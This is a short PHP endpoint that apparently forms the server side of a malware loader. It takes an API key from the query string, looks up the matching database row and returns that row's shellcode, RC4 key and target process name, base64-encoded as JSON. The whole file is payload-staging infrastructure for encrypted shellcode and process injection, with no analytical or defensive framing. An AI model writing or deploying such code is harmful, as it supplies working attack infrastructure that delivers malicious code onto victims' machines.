<?php

include_once '../../helper/db.php';

$api_key = isset($_GET['id']) ? $_GET['id'] : null;

if ($api_key === null) 
{
    http_response_code(400);
    exit;
}

global $pdo;

$stmt = $pdo->prepare("SELECT `shellcode`, `rc4_key`, `process` FROM payload WHERE api = :api_key");
$stmt->bindParam(':api_key', $api_key, PDO::PARAM_STR);
$stmt->execute();

if ($stmt->rowCount() == 0)
{
    http_response_code(400);
    exit;
}

$result = $stmt->fetch(PDO::FETCH_ASSOC);

$payload = $result['shellcode'];
$key = $result['rc4_key'];
$name = $result['process'];

$response = [
    'payload' => $payload,
    'key' => $key,
    'process' => $name,
];

$response = base64_encode(json_encode($response));

header('Content-Type: application/json');
echo $response;

?>